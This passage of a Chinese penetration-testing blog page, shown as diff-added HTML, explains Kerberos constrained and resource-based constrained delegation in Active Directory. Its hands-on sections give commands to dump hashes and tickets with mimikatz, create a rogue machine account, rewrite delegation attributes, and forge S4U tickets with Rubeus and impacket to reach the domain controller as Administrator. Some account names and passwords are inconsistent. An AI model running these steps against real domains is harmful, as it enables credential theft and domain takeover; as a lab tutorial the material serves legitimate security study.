+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506195543.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506195543.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506195543.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506195543.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506195543.png-water_print" /></p>
+<ol>
+<li>
+<p>用户向 service1 发出请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</p>
+</li>
+<li>
+<p>通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</p>
+</li>
+<li>
+<p>KDC 返回给 Service1 一个用于用户验证 Service1 的 ST1，该 ST1 可能包含用户的授权数据。</p>
+</li>
+<li>
+<p>service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。
+注：尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了</p>
+</li>
+<li>
+<p>用户向 service1 发出请求，service1 需要以用户身份访问 service2 上的资源。</p>
+</li>
+<li>
+<p>service1 以用户的名义向 KDC 请求用户访问 service2 的 ST2</p>
+</li>
+<li>
+<p>如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。</p>
+</li>
+<li>
+<p>service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。</p>
+</li>
+<li>
+<p>service2 响应步骤 8 的请求。</p>
+</li>
+<li>
+<p>service1 响应用户对步骤 5 中的请求。</p>
+</li>
+</ol>
+<p>当被设置为<code>约束性委派</code>时，其 <code>userAccountControl</code> 属性包含 <code>TRUSTED_TO_AUTH_FOR_DELEGATION(T2A4D)</code>，且 <code>msDS-AllowedToDelegateTo</code> 属性会被设置为哪些协议</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505112138.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505112138.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505112138.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505112138.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505112138.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505112138.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031170444.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031170444.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031170444.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031170444.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031170444.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031170444.png-water_print" /></p>
+<p>由此可以看出，约束委派不需要其它用户主动请求可以模拟用户。当拿下一个配置约束委派的用户，就可以拿下配置对应委派主机的权限。</p>
+<h3 id="32-实战">3.2 实战</h3>
+<h4 id="321-约束委派的查找">3.2.1 约束委派的查找</h4>
+<h5 id="3211-adfind">3.2.1.1 adfind</h5>
+<p><strong>查询约束委派的主机</strong>：</p>
+<p><code>AdFind.exe -b &quot;DC=pentest,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125170246.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125170246.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125170246.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125170246.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125170246.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125170246.png-water_print" /></p>
+<p><strong>查询约束委派的用户</strong>：</p>
+<p><code>AdFind.exe -b &quot;DC=pentest,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></p>
+<h5 id="3212-powerview">3.2.1.2 powerview</h5>
+<p><strong>查询约束委派的主机</strong>：</p>
+<p><code>Get-DomainComputer -TrustedToAuth -Domain test.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto</code></p>
+<p><strong>查询约束委派的用户</strong>：</p>
+<p><code>Get-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</code></p>
+<h5 id="3213-ldapsearch">3.2.1.3 ldapsearch</h5>
+<p><strong>查询约束委派的机器：</strong></p>
+<p><code>ldapsearch -LLL -x -H ldap://IP:389 -D &quot;user@pentest.com&quot; -w &quot;123456&quot; -b dc=pentest,dc=com  &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125174356.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125174356.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125174356.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125174356.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125174356.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125174356.png-water_print" /></p>
+<p><strong>查询约束委派的用户：</strong></p>
+<p><code>ldapsearch -LLL -x -H ldap://IP:389 -D &quot;user@pentest.com&quot; -w &quot;123456&quot; -b dc=pentest,dc=com  &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></p>
+<h4 id="322-约束委派的利用">3.2.2 约束委派的利用</h4>
+<h5 id="3221-常见情况">3.2.2.1 常见情况</h5>
+<p>已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务，是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者 hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST。</p>
+<p><strong>先抓出主机账户的 NTLM Hash 值：</strong></p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126143432.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126143432.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126143432.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126143432.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126143432.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126143432.png-water_print" /></p>
+<p><strong>申请 TGT：</strong></p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>如果拥有服务用户登录的主机权限，可以用 <code>mimikatz</code> 直接从内存中把服务用户的 TGT dump 出来，可以跳过申请 TGT 这个步骤，直接用 mimikatz 导出 TGT：</p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</code></p>
+</div>
+        </div>
+    </div>
+<p>NTLM Hash 和密码都可以：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">tgt::ask /user:win7$ /domain:pentest.com /ntlm:&lt;抓取到的哈希&gt;
+tgt::ask /user:win7$ /domain:pentest.com /password:12345
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126145859.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126145859.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126145859.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126145859.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126145859.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126145859.png-water_print" /></p>
+<p>通过 TGT，<strong>请求</strong>一张以 <code>Administrator</code> 用户身份访问对应服务 2（<strong>DC 的 cifs 服务</strong>）的 ST：<code>tgs::s4u /tgt:TGT_win7$@PENTEST.COM_krbtgt~pentest.com@PENTEST.COM.kirbi /user:administrator@pentest.com /service:cifs/dc.pentest.com</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150503.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150503.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150503.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150503.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150503.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150503.png-water_print" /></p>
+<p><code>S4U2Self </code>获取到的 ST1 以及 <code>S4U2Proxy</code> 获取到的 DC CIFS 服务的 ST2 会保存在当前目录下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150616.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150616.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150616.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150616.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150616.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150616.png-water_print" /></p>
+<p>用 mimikatz 将 ST2 导入当前会话即可：</p>
+<p><code>kerberos::ptt TGS_administrator@pentest.com@PENTEST.COM_cifs~dc.pentest.com@PENTEST.COM.kirbi</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150813.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150813.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150813.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150813.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150813.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126150813.png-water_print" /></p>
+<h5 id="3222-spn-设置影响对应票据">3.2.2.2 SPN 设置影响对应票据</h5>
+<p>当委派的权限不是 cifs 时，如 time 权限，如何进一步测试？</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126160819.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126160819.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126160819.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126160819.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126160819.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126160819.png-water_print" /></p>
+<p>通过在 hex 模式下修改 ST2，将 time 修改为 cifs，即可通过 smbexec 执行命令。</p>
+<h2 id="4-基于资源的约束委派">4 基于资源的约束委派</h2>
+<h3 id="41-原理">4.1 原理</h3>
+<p>上文的约束委派中提到，如果配置受约束的委派，必须拥有 SeEnableDelegation 特权，该特权是敏感的，通常仅授予域管理员。为了使用户/资源更加独立，Windows Server 2012 中引入了基于资源的约束委派。基于资源的约束委派(RBCD)配置在后端目标服务或资源上(例如后端的 CIFS 服务)，而不是在前端的服务或资源上(例如前端的 WEB 等)。基于资源的约束委派允许资源配置受信任的帐户委派给他们。</p>
+<p>基于资源的约束委派和传统的约束委派非常相似，但是作用的方向实际上是相反的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126162854.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126162854.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126162854.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126162854.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126162854.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210126162854.png-water_print" /></p>
+<p><strong>传统的约束委派</strong>：在 ServiceA 的 <code>msDS-AllowedToDelegateTo</code> 属性中配置了对 ServiceB 的信任关系，定义了到 ServiceB 的传出委派信任。传统的约束委派 S4U2Self 返回的票据一定是可转发的，如果不可转发那么 S4U2Proxy 将失败；但是基于资源的约束委派不同，就算 S4U2Self 返回的票据不可转发（可不可以转发由 TrustedToAuthenticationForDelegation 决定），S4U2Proxy 也是可以成功，并且 S4U2Proxy 返回的票据总是可转发。</p>
+<p><strong>资源约束委派</strong>：在 ServiceB 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中配置了对 ServiceA 的信任关系，定义了从 ServiceA 的传入信任关系。资源本身可以为自己配置资源委派信任关系，资源本身决定可以信任谁，该信任谁。</p>
+<p><strong>利用条件</strong>：简单来说就是你获得的用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击。</p>
+<p>相信此时大家应该明白了**基于资源的约束委派(RBCD)**的认证流程。怎么来设置基于资源的约束委派呢？其中 msDS-AllowedToActOnBehalfOfOtherIdentity 是关键。</p>
+<p>首先我们来思考一个问题：**&ldquo;谁有权限能修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值呢?&rdquo; **</p>
+<p>分析环境如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">角色</th>
+<th style="text-align:center">用户</th>
+<th style="text-align:center">系统</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">域内普通机器</td>
+<td style="text-align:center">Redteam\web3user</td>
+<td style="text-align:center">Win 2012</td>
+</tr>
+<tr>
+<td style="text-align:center">域控机器</td>
+<td style="text-align:center">Redteam\administrator</td>
+<td style="text-align:center">Win 2012</td>
+</tr>
+</tbody>
+</table>
+<p>查询 web3 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性发现默认是不存在的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210228112743.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210228112743.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210228112743.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210228112743.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210228112743.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210228112743.png-water_print" /></p>
+<p>由此得知所有加入域的机器默认不存在这个属性，需要手动添加才行。</p>
+<p>那么谁有权限能修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值的问题就变成了谁有权限添加 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。</p>
+<p>经过查询，以下两个用户具有该权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">REDTEAM\web3user -&gt; WriteProperty
+NT AUTHORITY\SELF -&gt; WriteProperty
+</code></pre></td></tr></table>
+</div>
+</div><p>为什么 REDTEAM\web3user 拥有 WriteProperty 权限呢？当 web3 计算机通过域用户 web3user 加入域时，域内会创建名为 <code>web3.redteam.com</code> 的计算机对象，而创建者就是 <code>web3user</code>，所以该域用户具有对 <code>web3.redteam.com</code> 的 WriteProperty 权限。</p>
+<h3 id="42-实战">4.2 实战</h3>
+<p>攻击流程：</p>
+<p>假设开启基于资源的约束性委派机器为 A</p>
+<ol>
+<li>首先要有一个对当前计算机有写权限的账户，才能对 A 设置可以被委派访问的服务账户。</li>
+<li>利用当前账户创建一个机器账户，并配置好机器账户到 A 的基于资源的约束性委派</li>
+<li>因为机器账户是我们创建的，我们知道它的密码账户，可以让它利用 S4U2SELF 协议获得一个不可转发 ST。然后用这个不可转发 ST 通过 S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问 A cifs 服务的 ST2。</li>
+<li>用 ST2 访问 A 的 CIFS 服务，获得权限。</li>
+</ol>
+<h4 id="421-环境模拟">4.2.1 环境模拟</h4>
+<p>首先要查找域中的某个域用户对目标机器的属性有写权限，在此处手动添加一个用户，以模拟该权限：</p>
+<ul>
+<li>直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127152910.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127152910.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127152910.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127152910.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127152910.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127152910.png-water_print" /></p>
+<h4 id="422-寻找对目标主机账户有完全控制权限的用户">4.2.2 寻找对目标主机账户有完全控制权限的用户</h4>
+<ul>
+<li>利用 powerview 查看当前用户 SID，并查看当前用户对某台主机是否有写权限</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># 查看 SID</span>
+<span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="no">[userName]</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
+
+<span class="c"># 查看写权限</span>
+<span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="no">[computerName]</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;SID&#34;</span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127153216.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127153216.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127153216.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127153216.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127153216.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127153216.png-water_print" /></p>
+<p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。</p>
+<h4 id="423-创建机器账号">4.2.3 创建机器账号</h4>
+<p>现在还需要的是一个具有 SPN 的账户，因为 <code>S4U2Self</code> 只适用于具有 SPN 的账户，恰好的是在域中有一个属性 <code>MachineAccountQuota</code>，这个值表示的是允许用户在域中创建的计算机帐户数，默认为 10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册 <code>RestrictedKrbHost/domain</code> 和 <code>HOST/domain</code> 这两个 SPN 的，所以这里刚好符合我们的意图。</p>
+<p>可以使用 <code>Powermad </code>中的 <code>New-MachineAccount</code> 来创建一个用户名为 <code>evilsystem</code>，密码为 <code>evil </code>的计算机账户</p>
+<p><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener noreffer">https://github.com/Kevin-Robertson/Powermad</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">evilsystem</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;testObject&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>添加了一个密码 testObject，名为 hacksystem 的机器账户，接下来就是配置 hacksystem 到 WIN7 的委派了。我们需要做的，是修改 WIN7 的  <code>msDS-AllowedToActOnBehalfOfOtherIdentity </code> 属性的值 ，这个操作我们用 powerview 实现。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># 这里的 sid -&gt; S-1-5-21-3298638106-3321833000-1571791979-1112</span>
+<span class="c"># 是我们创建的 机器用户 evilsystem 的 sid，在 powerview 下用 </span>
+<span class="nb">Get-Domiancomputer</span> <span class="n">hacksystem</span>
+<span class="c"># 获取</span>
+
+<span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&#34;</span>
+
+<span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
+
+<span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+
+<span class="nb">Get-DomainComputer</span> <span class="p">[</span><span class="n">目标主机名</span><span class="p">]|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>验证是否成功添加：</p>
+<p><code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code></p>
+<p>配置完 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性之后就可以通过基于资源的约束委派去攻击目标主机了</p>
+<h4 id="424-攻击">4.2.4 攻击</h4>
+<p>攻击路径：user -&gt; evil -&gt; target</p>
+<p>本地导出机器用户的 ntlm hash：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Rubeus.exe <span class="nb">hash</span> /user:evilsystem /password:testObject /domain:xxx
+</code></pre></td></tr></table>
+</div>
+</div><p>然后用 <code>evilsystem$ </code>的 hash 请求白银票据并导入到当前会话中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/dc /ptt
+
+Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:host/dc /ptt
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="425-注意事项">4.2.5 注意事项</h4>
+<p>Rubeus 申请的票据和 impacket 申请的缓存票据有差别，测试时使用 Psexec 返回一个 shell 失败，需要再申请一个 HOST 票据。</p>
+<p>impacket</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">getST.py -dc-ip IP -spn cifs/target -impersonate administrator pentest.com/evilsystem$:evil
+
+<span class="nb">set</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+
+python psexec.py -nopass -k target
+
+<span class="c1"># 或者利用 mimikatz 导入票据</span>
+mimikatz.exe <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;kerberos::ptc administrator.ccache&#34;</span>
+Psexec.exe <span class="se">\\</span>target -s cmd
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="426-解决敏感账户不能委派">4.2.6 解决敏感账户不能委派</h4>
+<p>利用条件：知道目标的主机账户的凭证</p>
+<p><strong>注：</strong> 一般情况下主机在加入域中会随机设置主机账户的密码，所以一般情况下用的是主机账户 hash，并且不能修改主机账户的密码，否则该主机就会和域失去信任。</p>
+<p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p>
+<p>在以 administrator 账户身份进行 S4U 时，只能进行 S4U2SELF，不能进行S4U2PROXY。</p>
+<p>用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/target /ptt</code>继续实验 administrator，发现确实是这样</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210127160903.png-water_print"
